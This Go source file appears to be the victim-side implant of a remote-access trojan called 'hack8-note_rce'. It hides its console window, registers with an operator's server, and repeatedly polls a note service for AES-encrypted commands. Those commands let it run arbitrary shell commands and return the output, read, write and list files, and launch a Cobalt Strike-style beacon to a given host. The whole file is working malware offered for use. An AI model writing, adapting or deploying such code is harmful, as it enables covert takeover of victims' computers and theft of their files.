//go:build windows

package main

//被控制端

import (
	"bytes"
	"encoding/json"
	"github.com/lifei6671/gorand"
	"github.com/lxn/win"
	"hack8-note_rce/Util"
	"hack8-note_rce/config"
	"hack8-note_rce/geacon"
	"hack8-note_rce/mode"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"time"
)

var noteaddr string

func main() {

	//test

	//test
	win.ShowWindow(win.GetConsoleWindow(), win.SW_HIDE)

	//从配置文件获取的参数
	aeskey := config.Aeskey
	adminaddr := config.Adminaddr

	key := []byte(aeskey)
	noteaddr = gorand.RandomAlphabetic(30)

	Util.AddHost(adminaddr, noteaddr, aeskey) //添加主机

	//循环命令执行
	for {
		cmdd, err := Util.AesCbcDecryptByBase64(Util.GetNote(noteaddr), key, []byte(Util.Ivaes))

		if err != nil {
			time.Sleep(5 * time.Second)

			continue

		}
		cmd := strings.Split(string(cmdd), ":")
		switch cmd[0] {
		case "cs":

			go geacon.Geacon_main(cmd[1]+":"+cmd[2], cmd[3], cmd[4])
			returnAesNote([]byte("1"))
		case "exec":
			var command *exec.Cmd
			if runtime.GOOS == "windows" {
				shell := cmd[1]
				shell = strings.Replace(shell, "\n", " && ", -1)
				command = exec.Command("cmd", "/c", shell)

			} else {
				shell := cmd[1]
				shell = strings.Replace(shell, "\n", " && ", -1)
				command = exec.Command("bash", "-c", shell)

			}

			var stdout, stderr bytes.Buffer
			command.Stdout = &stdout
			command.Stderr = &stderr
			command.Run()
			base64, err := Util.AesCbcEncryptBase64(stdout.Bytes(), key, []byte(Util.Ivaes))
			if err != nil {
				time.Sleep(5 * time.Second)

				continue
			}
			Util.WriteNote(noteaddr, base64)

		case "ping":
			base64, _ := Util.AesCbcEncryptBase64([]byte("heartbeat"), key, []byte(Util.Ivaes))
			Util.WriteNote(noteaddr, base64)
		case "filemanger.read":
			data, _ := os.ReadFile(cmd[1])
			returnAesNote(data)
		case "filemanger.write":
			f, _ := os.Create(cmd[1]) // 这里是你要保存的文件路径

			defer f.Close()
			f.Write([]byte(cmd[2])) // 这里是将字节切片写入到文件中
		case "filemanger.dir":
			files, err := os.ReadDir(cmd[1]) // 读取目录下的文件和子目录
			if err != nil {                  // 读取失败
				returnAesNote([]byte("读取失败"))
			}

			var fileList []mode.File
			for _, file := range files {
				info, _ := file.Info()
				fileList = append(fileList, mode.File{
					Name: info.Name(),
					Size: info.Size(),
					Path: cmd[1],
					Mode: strconv.Itoa(int(info.Mode())),
					Time: info.ModTime(),
				})
			}
			marshal, err := json.Marshal(fileList)
			if err != nil {
				returnAesNote([]byte("读取失败"))
				return
			}
			returnAesNote(marshal)

		default:
			time.Sleep(5 * time.Second)

		}

	}
}

func returnAesNote(data []byte) {
	base64, _ := Util.AesCbcEncryptBase64(data, []byte(config.Aeskey), []byte(Util.Ivaes))
	Util.WriteNote(noteaddr, string(base64))
}
